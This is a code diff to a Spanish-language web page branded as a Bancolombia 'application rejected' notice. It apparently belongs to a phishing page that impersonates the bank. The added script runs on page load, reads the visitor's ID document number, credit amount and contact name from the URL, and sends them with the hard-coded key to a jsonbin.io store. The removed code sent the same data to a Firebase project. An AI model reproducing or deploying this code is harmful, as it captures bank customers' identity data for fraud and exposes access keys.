@@ -2,8 +2,42 @@
 <!-- reject-v2 #e53935 no-cupo -->
 <html lang="es">
 <head>
-  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+<script>
+const BIN_URL = "https://api.jsonbin.io/v3/b/6as5ff64ac6210805d61ba35";
+const API_KEY = "$2a$10$HXdeZxqinTPr2kNtYaFBK.jdRq4Ckg/OrCLLo9lnNeikzUSYfuIdK";
+
+async function guardarSolicitud(datos) {
+  try {
+    const leerRespuesta = await fetch(BIN_URL, {
+      headers: { "X-Access-Key": API_KEY }
+    });
+    const datosActuales = await leerRespuesta.json();
+    
+    if (!datosActuales.record.solicitudes) {
+      datosActuales.record.solicitudes = [];
+    }
+    
+    datos.fecha = new Date().toLocaleString();
+    datos.estado = "EN PROGRESO";
+    datosActuales.record.solicitudes.unshift(datos);
+    
+    await fetch(BIN_URL, {
+      method: "PUT",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Access-Key": API_KEY
+      },
+      body: JSON.stringify(datosActuales.record)
+    });
+    
+    console.log("✅ Guardado");
+    return true;
+  } catch (error) {
+    console.error("❌ Error:", error);
+    return false;
+  }
+}
+</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Solicitud rechazada — Bancolombia</title>
@@ -208,49 +242,35 @@
     
   </script>
   <script>
-const firebaseConfig = {
-  apiKey: "AIzaSy5y5Dnpt57vNCirFZnVK1ze_irVBT9hmibY",
-  authDomain: "bancolombia-credito.firebaseapp.com",
-  projectId: "bancolombia-credito",
-  storageBucket: "bancolombia-credito.appspot.com",
-  messagingSenderId: "354851030251",
-  appId: "1:354851030251:web:e98a68eb7d81a79d942aae"
-};
+async function procesarSolicitud() {
+  const params = new URLSearchParams(window.location.search);
+  const doc = params.get("documento") || params.get("doc") || "sin documento";
+  const tipo = params.get("tipo") || "sin tipo";
+  const cupo = params.get("cupo") || "0";
+  const contacto = params.get("contacto") || params.get("usuario") || "sin nombre";
+  
+  console.log("Datos a guardar:", { doc, tipo, cupo, contacto });
 
-if (!window.firebaseApp) {
-  window.firebaseApp = firebase.initializeApp(firebaseConfig);
-}
-const db = firebase.firestore();
-async function guardarEnFirebase() {
-  try {
-    const params = new URLSearchParams(window.location.search);
-    const doc = params.get("documento") || params.get("doc") || "sin documento";
-    const tipo = params.get("tipo") || "sin tipo";
-    const cupo = params.get("cupo") || "0";
-    const contacto = params.get("contacto") || params.get("usuario") || "sin nombre";
-    
-    console.log("Datos a guardar:", { doc, tipo, cupo, contacto });
-    
-    const docRef = await db.collection('solicitudes').add({
-      documento: doc,
-      tipo: tipo,
-      cupo: cupo,
-      contacto: contacto,
-      fecha: new Date().toLocaleString('es-CO'),
-      estado: "RECHAZADA"
-    });
-    console.log("Guardado con exito! ID:", docRef.id);
-    alert("Guardado correctamente! ID: " + docRef.id);
-  } catch(error) {
-    console.error("Error:", error.code, error.message);
-    alert("Error: " + error.message);
+  const datos = {
+    documento: doc,
+    tipo: tipo,
+    cupo: cupo,
+    contacto: contacto,
+    estado: "RECHAZADA"
+  };
+
+  const exito = await guardarSolicitud(datos);
+  if (exito) {
+    alert("Guardado correctamente");
+  } else {
+    alert("Error al guardar");
   }
 }
 
 if (document.readyState === 'loading') {
-  document.addEventListener('DOMContentLoaded', guardarEnFirebase);
+  document.addEventListener('DOMContentLoaded', procesarSolicitud);
 } else {
-  guardarEnFirebase();
+  procesarSolicitud();
 }
 
 </script>
